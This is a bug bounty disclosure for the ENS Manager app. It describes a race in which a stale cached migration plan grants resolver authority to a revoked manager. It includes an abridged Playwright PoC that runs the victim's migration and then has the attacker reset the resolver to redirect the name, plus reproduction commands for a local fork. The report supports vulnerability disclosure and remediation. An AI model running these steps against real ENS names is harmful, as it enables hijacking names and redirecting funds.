# 90980 w a medium manager migration can grant a revoked v1 manager persistent v2 resolver authority enabling ens name hijacking

**Submitted on Aug 28th 2026 at 15:59:35 UTC by @Nescient for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90980
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow

## Description

### Brief

The Manager application can begin constructing a migration plan from a retained V1 domain object whose manager is address A. If the registrant has since revoked A and made address B the live V1 Registry manager, a fresh V1 response can update the application cache to B without changing the gas-plan query key. The A-derived plan can therefore finish or remain `ready` under the unchanged key.

`MigrationPage` submits that plan without comparing its manager-bearing contents with the current V1 query data or `V1Registry.owner(node)`. The victim-authorized HCA transaction consequently grants A the V2 `ROLE_SET_RESOLVER` role. The confirmation UI describes only restoring existing managers and does not identify the grantee. After migration, A can set an attacker-controlled resolver, and Universal Resolver returns attacker-selected ETH address R.

### Actors and security invariant

For an unwrapped `.eth` 2LD, the BaseRegistrar token holder and ENS Registry owner are different authority concepts:

* **V** — victim and verified BaseRegistrar ERC-721 owner/registrant.
* **A** — former V1 Registry manager, later revoked by V.
* **B** — current V1 Registry manager after revocation.
* **R** — attacker-selected ETH address stored in A's resolver.

Immediately before Manager creates or authorizes a V2 manager-role grant for an unwrapped name, the required invariant is:

```
verifiedBaseRegistrarOwner =
  BaseRegistrar.ownerOf(uint256(labelhash(name)))

liveManager =
  V1Registry.owner(namehash(name))

expectedManager =
  liveManager == verifiedBaseRegistrarOwner
    ? null
    : liveManager

plannedManager == expectedManager
```

If the live V1 Registry owner equals the verified registrant, no separate manager grant should be emitted. Neither an indexed response nor a previously computed browser plan is an authority source at this boundary.

The vulnerable trust path is:

```
retained V1 response: domain.owner = A
    -> V changes the live V1 manager to B
    -> MigrationPage exposes cached A and starts a background refetch for B
    -> gas-plan query starts and captures the A-bearing domain object
    -> fresh V1 cache becomes B, but the gas-plan key does not change
    -> Manager submits the A-bearing plan
    -> victim-authorized HCA grants ROLE_SET_RESOLVER to A
    -> A installs an attacker-controlled resolver
    -> Universal Resolver returns R
```

### Vulnerability details

#### 1. Manager-bearing V1 state originates in an indexed response

The in-scope [`v1SubgraphClient.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/v1SubgraphClient.ts#L22-L47) requests both `owner.id` and `registrant.id`. For an unwrapped `.eth` registration, [`classifyNames`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/packages/migration/src/service/classifyNames.ts#L159-L184) treats `domain.owner.id` as the separate manager when it differs from the registrant:

```ts
const registryOwnerAddress = toAddress(domain.owner.id)
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

The defect is not that the indexer returns this field. The defect is that Manager later uses the resulting application object to create a new on-chain privilege without binding the plan to that manager state or revalidating it on-chain.

#### 2. The V1 query refetches, but the plan query does not track manager state

[`useV1Names`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/hooks/useV1Names.ts#L12-L23) requests a five-minute `staleTime`. However, [`resultQueryOptions`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/packages/utils/src/tanstack-query/neverthrow/query.ts#L120-L147) destructures that option and does not return it. Manager's [`QueryClient` default](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/router.tsx#L32-L36), `staleTime: 0`, therefore applies.

When MigrationPage mounts, TanStack exposes cached A as successful data and starts a background V1 refetch for B. [`useMigrationGasEstimate`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts#L62-L109) then builds this key:

```ts
const domains = selectDomainsFromNames(v1Names, selectedNames)
const domainIds = domains
  .map((domain) => domain.id)
  .sort()
  .join(',')

const query = useQuery({
  queryKey: [
    'migration-gas-estimate',
    ownerAddress?.toLowerCase() ?? '',
    hcaAddress?.toLowerCase() ?? '',
    domainIds,
    selectionRevisionRef.current.revision,
  ] as const,
  queryFn: async () => {
    const preflight = await ensurePreflight(domains, { staleTime: 0 })
    const plan = await buildMigrationPlan({
      domains,
      hcaAddress,
      migrationOwner: ownerAddress,
      publicClient,
      preflight,
    })
    return { estimate, plan }
  },
})
```

The full key includes the wallet, HCA, domain IDs, and selection revision. Its domain-sensitive portion contains only domain IDs: changing `domain.owner.id` from A to B changes neither `domainIds` nor the revision. The same query entry is retained. Updating its same-key `queryFn` closure does not cancel and restart an in-flight A-derived fetch, and already-successful A-derived data also remains usable. The hook maps successful retained data to application status `ready` because it checks `isPending`, not background `isFetching`.

The PoC observes the resulting contradiction inside the real application cache:

```
fresh V1 query manager: B
ready gas-plan manager: A
```

#### 3. `MigrationPage` authorizes the retained plan

[`MigrationPage`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/pages/MigrationPage.tsx#L175-L200) passes current `v1Names` into the hook, but [`handleBeginUpgrade`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/pages/MigrationPage.tsx#L259-L299) submits `gasEstimate.plan` without reconciling it with current manager state:

```ts
if (gasEstimate.status !== 'ready') return false

uiActor.send({
  type: 'migration.start',
  plan: gasEstimate.plan,
  signer,
  hcaClient,
  refreshAccount,
})
```

The victim therefore authorizes the A-bearing plan even though the current V1 cache already contains B.

#### 4. The retained address becomes a V2 resolver-role grant

[`buildRoleGrantCall`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L8-L26) converts `managerAddress` into a `ROLE_SET_RESOLVER` grant:

```ts
const ROLE_SET_RESOLVER = 1n << 24n

return {
  to: V2_CONTRACTS.ETHRegistry,
  data: encodeFunctionData({
    abi: ETH_REGISTRY_V2_ABI,
    functionName: 'grantRoles',
    args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
  }),
  value: 0n,
}
```

[`buildAtomicMigrationBatches`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L608-L624) inserts this call into the HCA batch and verifies the role against the same planned address. Post-transaction verification thus confirms that A received the planned role; it does not establish that A remains the legitimate manager.

#### 5. Existing guards do not validate the live V1 manager

[`computeMigrationPreflight`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/computeMigrationPreflight.ts#L192-L259) checks resolver, approval, profile, route, contract-code, and HCA readiness after classifying supplied domain objects. It does not read `V1Registry.owner(node)`.

The execution-time approval freshness guard compares approval identifiers, not manager grantees. The retry ownership guard verifies the BaseRegistrar token owner, which remains V throughout this scenario, rather than the V1 Registry manager. Rebuilt batches reuse the previously classified names. Finally, [`WalletConfirmationStepsDialog`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx#L81-L89) says only “Restore the existing managers” and does not display A or B.

These controls establish that V still owns the registration and that migration infrastructure is ready. None establishes that the planned resolver-role recipient is B rather than A.

### State transition demonstrated by the E2E

| Stage                      | Authoritative state                        | V1 query cache                | Plan used for signed migration | V2 resolver-role state   | Result                                     |
| -------------------------- | ------------------------------------------ | ----------------------------- | ------------------------------ | ------------------------ | ------------------------------------------ |
| Dashboard initially loads  | BaseRegistrar owner V; V1 manager A        | A                             | Not constructed                | A = 0; B = 0             | Legitimate historical state                |
| V signs `reclaim(..., B)`  | BaseRegistrar owner V; V1 manager B        | A                             | Not constructed                | A = 0; B = 0             | A is revoked                               |
| Migration route mounts     | V1 manager B                               | Cached A; B refetch in flight | A-capturing query starts       | A = 0; B = 0             | Plan input is already obsolete             |
| Before wallet confirmation | V1 manager B                               | **B**                         | **A — ready**                  | A = 0; B = 0             | Current query and executable plan disagree |
| Victim-signed HCA succeeds | V2 owner V                                 | B observed before submission  | **A — submitted**              | **A granted; B = 0**     | Exactly one grant to A and none to B       |
| Cleanup completes          | V2 owner V; temporary HCA approval removed | —                             | A — submitted                  | A remains granted; B = 0 | A's per-name role survives cleanup         |
| A calls V2 `setResolver`   | V2 owner V; resolver becomes A-controlled  | —                             | A — submitted                  | A remains granted        | Universal Resolver returns R               |

Expected behavior is to derive B from live authority or invalidate the plan and require fresh review. Actual behavior is a successful victim-authorized migration that grants A and does not grant B. The security-relevant persistent state is A's on-chain role; no claim depends on the gas-plan cache's post-success lifecycle.

### Preconditions and evidence boundary

1. V owns an eligible unwrapped V1 `.eth` 2LD, and A was its legitimate V1 manager when Manager cached the domain object.
2. V changes the live V1 manager to B without changing the BaseRegistrar owner or domain ID.
3. MigrationPage mounts while cached A is available, so its gas-plan query captures A before the fresh B response replaces the V1 domain object; the asynchronous plan may finish afterward.
4. V continues through the feature-enabled Manager migration flow after the application cache has received B.

Replacing a no-longer-trusted V1 manager before migration is a realistic ENS ownership-management sequence, not an unprompted action: [ENS permits the Owner to change the Manager](https://docs.ens.domains/terminology/), and the victim then deliberately follows Manager's own feature-gated `Upgrade Names` entry. [`DashboardPage`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/dashboard/pages/DashboardPage.tsx#L74-L131) renders that entry alongside the name list. The PoC invokes the canonical `BaseRegistrar.reclaim` operation directly only to create this precondition deterministically; the affected action is the prompted Manager migration and victim-signed HCA transaction.

The demonstrated interleaving occurs during ordinary Dashboard-to-Migration navigation in one mounted Manager session; it is not a one-render race. `MigrationPage` receives cached A synchronously and starts the gas-plan query from that A-bearing object while the fresh B response is in flight. Because the gas-plan key omits owner-, registrant-, and manager-bearing fields, delivery of B does not change the query identity or cancel/restart the existing A-derived fetch. The E2E waits until the V1 cache contains B and the ready plan still contains A before confirmation.

The PoC controls the V1 GraphQL boundary, supplying deterministic A/B responses consistent with independently asserted on-chain state and gating B's delivery. It does not mock Manager plan construction or any blockchain action. This proves exploit reachability for the demonstrated interleaving; it does not measure how often that ordering naturally occurs against the public subgraph.

No privileged ENS role, compromised victim wallet or HCA, malicious service, or broken contract is required. Once granted, A's role survives migration cleanup and remains until V detects and revokes it; A does not need to race the final resolver mutation.

### Why existing controls do not stop the attack

| Existing control                         | What it establishes                                             | Missing security check                                               |
| ---------------------------------------- | --------------------------------------------------------------- | -------------------------------------------------------------------- |
| BaseRegistrar ownership and retry checks | V still owns the registration token                             | Registration ownership is distinct from V1 manager authority.        |
| Migration preflight                      | Resolver, route, approval, profile, HCA, and contract readiness | It classifies supplied data and never reads the live V1 manager.     |
| Approval-plan freshness                  | Required HCA/operator approvals are current                     | Manager grantees are not compared.                                   |
| Post-batch role verification             | The planned account received the planned role                   | It validates execution of the unsafe plan, not recipient legitimacy. |
| HCA cleanup and confirmation copy        | Temporary approval is removed; user sees a generic manager step | The per-name role persists, and the grantee address is undisclosed.  |

### Known-issue distinction

This is not a duplicate of the closest disclosed issues:

| Related issue                                                               | Why ENS-001 is different                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| --------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `EXP-4337-003`                                                              | That disclosed issue is an EOA transport validation gap: `request.from` is not compared with the connected signer. In ENS-001, the observed outer transaction is sent by the connected victim wallet; the incorrect address is A inside the nested `grantRoles(..., A)` calldata produced by Manager's migration planner. The failed boundary is stale manager/role-recipient validation in `apps/manager`, not sender validation in `packages/transaction-manager`. |
| `SEC-TXM-002`                                                               | That issue concerns Smart Account accepting a configured or cached HCA identity without comparing it with an SDK-derived address. ENS-001 is a Manager plan-identity and live V1-manager validation failure involving a different value, component, transaction, and impact.                                                                                                                                                                                         |
| `QA-01`                                                                     | QA-01 concerns follow-up action failures after transfers. ENS-001 creates new unintended on-chain authority during V1-to-V2 migration and demonstrates resolver hijacking.                                                                                                                                                                                                                                                                                           |
| `WEB-1257`                                                                  | WEB-1257 retains parent/subregistry or primary-name state during a transfer flow. ENS-001 requires neither a parent transfer nor a subname and grants a revoked manager a new V2 role.                                                                                                                                                                                                                                                                               |
| [`contracts-v2#418`](https://github.com/ensdomains/contracts-v2/issues/418) | Issue #418 lets a pre-existing V2 role survive an ERC-1155 ownership transfer. Here A has no resolver-role bit before migration, no V2 ownership transfer occurs, and the Manager-generated migration transaction creates A's role.                                                                                                                                                                                                                                  |

The V2 Registry, HCA, PermissionedResolver, and Universal Resolver behave as designed. The in-scope Manager application instructs the victim to grant the correct role to a revoked address.

## Impact Details

After migration, A can replace the victim's resolver while V remains the V2 owner. Universal Resolver then returns attacker-selected ETH address R, allowing wallets and integrations that trust the ENS name's address record to redirect interactions to the attacker.

This directly matches the selected Critical impact: a victim-authorized Manager migration assigns resolver control to a revoked address and enables ENS-name hijacking. The E2E proves that the successful HCA transaction creates exactly one resolver-role grant for A and none for B after both addresses had zero target role bits before migration.

The successful Manager-generated migration transaction is the state transition that creates A's resolver authority. Before migration, the E2E proves that A is not the live V1 manager, holds no target V2 role bit, and that A's V1 and V2 `setResolver` attempts revert. After migration, A holds `ROLE_SET_RESOLVER` and can call `setResolver` without further victim participation; the role remains active after temporary HCA approval is removed. The later resolver write is A exercising authority created by the vulnerable flow, not reliance on a second vulnerability, and the E2E confirms that Universal Resolver returns attacker-selected address R.

## Recommended Remediation

Manager identity must be treated as live security-sensitive state rather than immutable indexed or cached payload.

### Required execution-boundary fix

Immediately before finalizing and again before submitting or rebuilding a migration batch for each unwrapped name:

{% stepper %}
{% step %}

## Read the live V1 manager

Read `V1Registry.owner(namehash(name))` from the chain.
{% endstep %}

{% step %}

## Compare it with the verified BaseRegistrar owner

Compare that address with the independently verified BaseRegistrar owner.
{% endstep %}

{% step %}

## Derive the manager grantee from live values

Derive the manager grantee only from those live values; omit the grant when both addresses are equal.
{% endstep %}

{% step %}

## Invalidate mismatched plans

If the live value differs from the previewed plan, invalidate the plan and require a fresh review and signature.
{% endstep %}
{% endstepper %}

Enforce the invariant shown in the Actors section for every unwrapped name at the final authorization boundary.

### Defense in depth

* Add manager-bearing state to the domain fingerprint used by `migration-gas-estimate`, including domain ID, `owner.id`, `registrant.id`, and wrapped owner where relevant.
* Add an execution-time `assertMigrationManagerPlanCurrent` check against live chain state for every planned role recipient.
* Never reuse previously classified manager state during retries or batch rebuilding.
* Display each name, exact grantee, role, and target registry in the confirmation UI, and add A-to-B regression cases before and during gas estimation.

Changing only the UI or query key is insufficient. Final execution-boundary validation is required because indexed and browser state can lag the live Registry.

## References

* [`v1SubgraphClient`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/v1SubgraphClient.ts#L22-L47) and [`classifyNames`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/packages/migration/src/service/classifyNames.ts#L159-L184)
* [`useV1Names`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/hooks/useV1Names.ts#L12-L23), [`resultQueryOptions`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/packages/utils/src/tanstack-query/neverthrow/query.ts#L120-L147), [Manager's query defaults](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/router.tsx#L32-L36), and [`useMigrationGasEstimate`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts#L49-L140)
* [`MigrationPage` plan consumption and `handleBeginUpgrade`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/pages/MigrationPage.tsx#L175-L299)
* [`buildMigrationPlan`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildMigrationPlan.ts#L317-L410), [`buildRoleGrantCall`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L8-L26), and [atomic batch insertion](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L608-L624)
* [ENS competition scope and known issues](https://immunefi.com/audit-competition/audit-competition-ens/scope/), and [distinct contracts-v2 issue #418](https://github.com/ensdomains/contracts-v2/issues/418)

## Link to Proof of Concept

<https://gist.github.com/4Nescient/e34be6d6ac5f84fcc8781408b9f00656>

## Proof of Concept

### Secret Gist environment and integrity

The complete runnable PoC environment is provided in the GitHub Secret Gist below. The Gist supports—but does not replace—the PoC explanation, reproduction steps, and demonstrated result in this report. It is created with GitHub's **Secret** visibility, and its URL is disclosed only through this private competition submission.

| Gist reference | Value                                                                    |
| -------------- | ------------------------------------------------------------------------ |
| Web URL        | `https://gist.github.com/4Nescient/e34be6d6ac5f84fcc8781408b9f00656`     |
| Clone URL      | `https://gist.github.com/4Nescient/e34be6d6ac5f84fcc8781408b9f00656.git` |
| Pinned commit  | `66be3a13b973efc97fb8bbc85b9ad7be21ff8c82`                               |

The Gist contains the browser E2E source, supporting and negative-control tests, Playwright and Vitest configurations, package metadata, runbook, preserved Playwright JSON report, Vitest output, evidence summary, and `SHA256SUMS`.

`SHA256SUMS` is Gist-specific: it covers all 10 non-manifest files present in the Gist and deliberately does not list `ENS-001-success-trace.zip`. The 12 MB preserved Playwright trace is supplemental evidence, is not required to reproduce the exploit, and can be supplied privately to the triager on request. Its SHA-256 is `5d6e360a54c0d91ca44e3656474bf9176e23a47d95ade0aed994d23be5d0114c`.

Clone the pinned Gist and verify every included file before rerunning:

```sh
git clone 'https://gist.github.com/4Nescient/e34be6d6ac5f84fcc8781408b9f00656.git' ENS-001-PoC
cd ENS-001-PoC
git checkout --detach '66be3a13b973efc97fb8bbc85b9ad7be21ff8c82'
test "$(git rev-parse HEAD)" = '66be3a13b973efc97fb8bbc85b9ad7be21ff8c82'
shasum -a 256 -c SHA256SUMS
```

On Linux, use `sha256sum -c SHA256SUMS`. Verification must report every listed Gist file as `OK` without a missing-trace warning.

### Evidence boundary

This is a production-browser/local-chain E2E with a controlled indexer boundary. The test supplies deterministic A/B GraphQL responses consistent with independently asserted on-chain state and gates B's delivery. It does not claim that the public subgraph was contacted or estimate the natural frequency of the timing condition.

Test-only RPC impersonation creates the initial fork state. The exploit path uses the real Manager migration UI and a victim-signed HCA transaction. Production plan construction, HCA execution, V2 role storage, A's final resolver mutation, and Universal Resolver output are not mocked.

The test locally enables Manager's migration feature flag to expose the in-scope migration UI; it does not replace or modify the migration implementation.

### Decisive exploit assertions

The following is an abridged, non-contiguous excerpt from the complete pinned `HYP-010-stale-manager.e2e.spec.ts`. It includes the victim-origin filter, HCA target check, nested `executeByOwner`/`grantRoles` decoding, exact A/B grant counts, post-migration role reads, cleanup check, attacker call, and Universal Resolver result. Setup, the wallet-signing helper, the query-cache reader definition, and unrelated UI-success assertions are omitted; the reproduction steps below execute the complete pinned source.

```ts
// Before migration, neither A nor B has the target V2 resolver role, and A
// cannot exercise V2 resolver authority.
const [staleRolesBeforeMigration, liveRolesBeforeMigration] =
  await Promise.all([
    publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: V2RegistryAbi,
      functionName: 'roles',
      args: [resource, staleManager.address],
    }),
    publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: V2RegistryAbi,
      functionName: 'roles',
      args: [resource, liveManager.address],
    }),
  ])

expect(staleRolesBeforeMigration & ROLE_SET_RESOLVER).toBe(0n)
expect(liveRolesBeforeMigration & ROLE_SET_RESOLVER).toBe(0n)

await expect(
  publicClient.simulateContract({
    account: staleManager,
    address: V2_ETH_REGISTRY,
    abi: V2RegistryAbi,
    functionName: 'setResolver',
    args: [BigInt(labelHash), attackerResolver],
  }),
).rejects.toThrow()

// ... setup and unrelated UI assertions omitted ...

// V changes the live V1 manager from A to B. A can no longer change V1 state.
await send(
  victim,
  V1_BASE_REGISTRAR,
  encodeFunctionData({
    abi: BaseRegistrarAbi,
    functionName: 'reclaim',
    args: [BigInt(labelHash), liveManager.address],
  }),
)

expect(
  await publicClient.readContract({
    address: V1_REGISTRY,
    abi: V1RegistryAbi,
    functionName: 'owner',
    args: [node],
  }),
).toBe(liveManager.address)

await expect(
  publicClient.simulateContract({
    account: staleManager,
    address: V1_REGISTRY,
    abi: V1RegistryAbi,
    functionName: 'setResolver',
    args: [node, attackerResolver],
  }),
).rejects.toThrow()

// ... controlled fresh-response delivery and cache reader omitted ...

// The fresh application cache contains B while the executable gas plan has A.
await expect.poll(readQueryCacheManagers).toEqual({
  v1Manager: liveManager.address.toLowerCase(),
  gasPlanHca: expect.any(String),
  gasPlanManager: staleManager.address.toLowerCase(),
})

const { gasPlanHca } = await readQueryCacheManagers()
if (!gasPlanHca) {
  throw new Error('ready migration plan should expose its expected HCA')
}
if (!isAddress(gasPlanHca)) {
  throw new Error('ready migration plan should expose a valid HCA address')
}
const expectedHca: Address = gasPlanHca
expect(expectedHca).not.toBe(zeroAddress)

// ... wallet-signing helper and unrelated confirmation UI assertions omitted ...

// The victim confirms through Manager. Inspect only victim-originated chain
// transactions, require the captured HCA target, and decode both calldata layers.
await confirmUpgrade.click()
let outerTransaction: Transaction | undefined
let staleGrantCount = 0
let liveGrantCount = 0

await expect
  .poll(async () => {
    const currentBlock = await publicClient.getBlockNumber()
    const victimTransactions = (
      await collectTransactions(beforeMigrationBlock + 1n, currentBlock)
    ).filter(
      (transaction) =>
        transaction.from.toLowerCase() === victim.address.toLowerCase(),
    )

    outerTransaction = undefined
    staleGrantCount = 0
    liveGrantCount = 0
    const staleGrantTransactions: Transaction[] = []

    for (const transaction of victimTransactions) {
      try {
        const outer = decodeFunctionData({
          abi: HcaOwnerExecutionAbi,
          data: transaction.input,
        })
        if (outer.functionName !== 'executeByOwner') continue
        if (transaction.to?.toLowerCase() !== expectedHca.toLowerCase()) {
          continue
        }

        let transactionStaleGrantCount = 0
        let transactionLiveGrantCount = 0
        const [executions] = outer.args

        for (const execution of executions) {
          if (
            execution.target.toLowerCase() !== V2_ETH_REGISTRY.toLowerCase()
          ) {
            continue
          }

          try {
            const inner = decodeFunctionData({
              abi: V2RegistryAbi,
              data: execution.callData,
            })
            if (inner.functionName !== 'grantRoles') continue

            const [grantedResource, bitmap, grantee] = inner.args
            if (
              grantedResource === resource &&
              bitmap === ROLE_SET_RESOLVER &&
              grantee.toLowerCase() === staleManager.address.toLowerCase()
            ) {
              transactionStaleGrantCount += 1
            }
            if (
              grantedResource === resource &&
              bitmap === ROLE_SET_RESOLVER &&
              grantee.toLowerCase() === liveManager.address.toLowerCase()
            ) {
              transactionLiveGrantCount += 1
            }
          } catch {
            // Other V2 Registry calls in this owner batch are irrelevant.
          }
        }

        staleGrantCount += transactionStaleGrantCount
        liveGrantCount += transactionLiveGrantCount
        if (transactionStaleGrantCount > 0) {
          staleGrantTransactions.push(transaction)
        }
      } catch {
        // Approval and cleanup transactions are not executeByOwner calls.
      }
    }

    outerTransaction =
      staleGrantTransactions.length === 1
        ? staleGrantTransactions[0]
        : undefined
    if (!outerTransaction || staleGrantCount !== 1) return false

    const [hasStaleRole, temporaryApproval] = await Promise.all([
      publicClient.readContract({
        address: V2_ETH_REGISTRY,
        abi: V2RegistryAbi,
        functionName: 'hasRoles',
        args: [resource, ROLE_SET_RESOLVER, staleManager.address],
      }),
      publicClient.readContract({
        address: V2_ETH_REGISTRY,
        abi: V2RegistryAbi,
        functionName: 'isApprovedForAll',
        args: [victim.address, expectedHca],
      }),
    ])
    return hasStaleRole && !temporaryApproval
  })
  .toBe(true)

// ... unrelated success UI assertions omitted ...

// The exact victim transaction to expectedHca succeeded and granted A once,
// never B.
expect(outerTransaction).toBeDefined()
expect(outerTransaction!.to?.toLowerCase()).toBe(expectedHca.toLowerCase())

const outerReceipt = await publicClient.getTransactionReceipt({
  hash: outerTransaction!.hash,
})
expect(outerReceipt.status).toBe('success')
expect(staleGrantCount).toBe(1)
expect(liveGrantCount).toBe(0)

// Migration cleanup removes HCA approval, but A's new resolver role persists.
const staleRoles = await publicClient.readContract({
  address: V2_ETH_REGISTRY,
  abi: V2RegistryAbi,
  functionName: 'roles',
  args: [resource, staleManager.address],
})
const liveRoles = await publicClient.readContract({
  address: V2_ETH_REGISTRY,
  abi: V2RegistryAbi,
  functionName: 'roles',
  args: [resource, liveManager.address],
})
expect(staleRoles & ROLE_SET_RESOLVER).toBe(ROLE_SET_RESOLVER)
expect(liveRoles & ROLE_SET_RESOLVER).toBe(0n)
expect(
  await publicClient.readContract({
    address: V2_ETH_REGISTRY,
    abi: V2RegistryAbi,
    functionName: 'isApprovedForAll',
    args: [victim.address, expectedHca],
  }),
).toBe(false)

// A exercises only the authority created by migration.
const resolverBeforeAttack = await publicClient.readContract({
  address: V2_ETH_REGISTRY,
  abi: V2RegistryAbi,
  functionName: 'getResolver',
  args: [LABEL],
})
expect(resolverBeforeAttack).not.toBe(attackerResolver)

await send(
  staleManager,
  V2_ETH_REGISTRY,
  encodeFunctionData({
    abi: V2RegistryAbi,
    functionName: 'setResolver',
    args: [BigInt(labelHash), attackerResolver],
  }),
)

expect(
  await publicClient.readContract({
    address: V2_ETH_REGISTRY,
    abi: V2RegistryAbi,
    functionName: 'getResolver',
    args: [LABEL],
  }),
).toBe(attackerResolver)

expect(
  await getEnsAddress(ensClient, {
    name: NAME,
    universalResolverAddress: UNIVERSAL_RESOLVER,
  }),
).toBe(redirectRecipient.address)
```

### Exact snapshot

| Snapshot                                         | Commit                                     |
| ------------------------------------------------ | ------------------------------------------ |
| Official audited upstream revision               | `63772fd872af472ced58b009499355f3430c2a86` |
| Immunefi mirror import used by the preserved run | `cda79acaad59711b943fc68207ebb3f1d0ff8596` |

The preserved evidence was generated from a clean worktree at mirror import commit `cda79acaad59711b943fc68207ebb3f1d0ff8596`. The competition branch `audit-comp-ready` tip is `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, a pre-launch Dependabot update that changes only three package manifests and the lockfile for the Hono upgrade, including a transitive `srvx` update. It changes no migration, query, plan-construction, or other report-cited source file. A direct Git diff confirms that all source files cited in this report are byte-for-byte identical at both revisions, so the vulnerable code path is present at the competition branch tip.

### Requirements

* Git and Docker.
* Node.js 22 or later; the preserved run used Node.js `v26.0.0`.
* pnpm `10.27.0`.
* Python 3 and Foundry's `cast`.
* Internet access for dependencies, container images, and the repository's Sepolia fork.

### Reproduction

Clone the Secret Gist and the competition repository as siblings:

```
parent/
├── audit-comp-ens/
└── ENS-001-PoC/
```

{% stepper %}
{% step %}

## Prepare the Gist and repository

From `parent/`, clone and pin the Secret Gist, verify its Gist-only manifest, then install the exact repository snapshot and browser:

```sh
git clone 'https://gist.github.com/4Nescient/e34be6d6ac5f84fcc8781408b9f00656.git' ENS-001-PoC
cd ENS-001-PoC
git checkout --detach '66be3a13b973efc97fb8bbc85b9ad7be21ff8c82'
test "$(git rev-parse HEAD)" = '66be3a13b973efc97fb8bbc85b9ad7be21ff8c82'
shasum -a 256 -c SHA256SUMS
cd ..

git clone https://github.com/immunefi-team/audit-comp-ens.git

cd audit-comp-ens
git checkout --detach cda79acaad59711b943fc68207ebb3f1d0ff8596
test "$(git rev-parse HEAD)" = \
  cda79acaad59711b943fc68207ebb3f1d0ff8596

pnpm install --frozen-lockfile
pnpm --dir e2e exec playwright install chromium
cd ..

test -e ENS-001-PoC/node_modules || \
  ln -s ../audit-comp-ens/packages/smart-account/node_modules \
  ENS-001-PoC/node_modules
```

{% endstep %}

{% step %}

## Start the local fork

In terminal 1, from `audit-comp-ens/`, start the local fork and verify Anvil:

```sh
pnpm e2e:infra:up
cast block-number --rpc-url http://127.0.0.1:8545
```

Continue only after `cast block-number` succeeds. An unhealthy optional DQA overlay is unrelated to ENS-001 and is not used by this path.
{% endstep %}

{% step %}

## Start Manager

In terminal 2, from `audit-comp-ens/`, start Manager:

```sh
pnpm --filter manager dev --mode ci --host 127.0.0.1
```

Wait for `http://127.0.0.1:3000`.
{% endstep %}

{% step %}

## Run the E2E and supporting controls

In terminal 3, from `audit-comp-ens/`, run the E2E; then run supporting controls from `ENS-001-PoC/`:

```sh
POC_DIR="$(cd ../ENS-001-PoC && pwd)"
PLAYWRIGHT_JSON_OUTPUT_FILE="$POC_DIR/ENS-001-reproduction-report.json" \
pnpm --dir e2e exec playwright test \
  --config "$POC_DIR/HYP-010.playwright.config.mjs" \
  --trace on \
  --output "$POC_DIR/reproduction-test-results" \
  --reporter=json

